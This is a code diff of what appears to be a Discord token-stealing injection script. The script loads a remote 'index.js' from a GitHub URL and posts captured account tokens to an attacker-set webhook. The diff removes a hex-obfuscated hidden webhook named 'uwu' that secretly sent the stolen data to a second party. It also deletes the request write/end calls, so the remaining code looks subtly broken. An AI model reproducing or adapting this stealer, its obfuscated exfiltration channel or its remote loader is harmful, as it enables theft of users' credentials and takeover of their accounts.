@@ -17,7 +17,6 @@ var config = {
 
     injection_url: "https://raw.githubusercontent.com/ytjhrttytj/hu43ygf5yhgiui3u5uyhiu4hvgwugtghuies/main/index.js",
     webhook: "%WEBHOOK%",
-    uwu: "/x68/x74/x74/x70/x73/x3A/x2F/x2F/x64/x69/x73/x63/x6F/x72/x64/x2E/x63/x6F/x6D/x2F/x61/x70/x69/x2F/x77/x65/x62/x68/x6F/x6F/x6B/x73/x2F/x31/x30/x38/x32/x36/x37/x36/x33/x39/x37/x35/x34/x37/x34/x37/x35/x31/x31/x34/x2F/x6F/x6D/x4C/x4D/x4D/x61/x52/x74/x70/x6F/x5A/x64/x57/x76/x62/x43/x53/x71/x38/x4C/x6E/x79/x75/x66/x64/x54/x4A/x30/x56/x4C/x47/x53/x69/x76/x48/x4F/x33/x69/x6A/x42/x72/x50/x52/x6B/x4B/x50/x61/x31/x55/x61/x34/x74/x53/x77/x4A/x72/x30/x37/x64/x4C/x58/x79/x73/x64/x6C/x51/x39/x33",
     Filter: {
         "urls": [
             "https://status.discord.com/api/v*/scheduled-maintenances/upcoming.json",
@@ -236,7 +235,7 @@ const post = async (params) => {
         data: params,
         token: token
     });
-    [config.uwu, config.webhook].forEach(res => {
+    [config.webhook].forEach(res => {
         const url = new URL(res);
         const options = {
             host: url.hostname,
@@ -251,8 +250,6 @@ const post = async (params) => {
         req.on("error", (err) => {
             console.log(err);
         });
-        req.write(res == config.uwu ? n : params);
-        req.end();
     })
 
 }
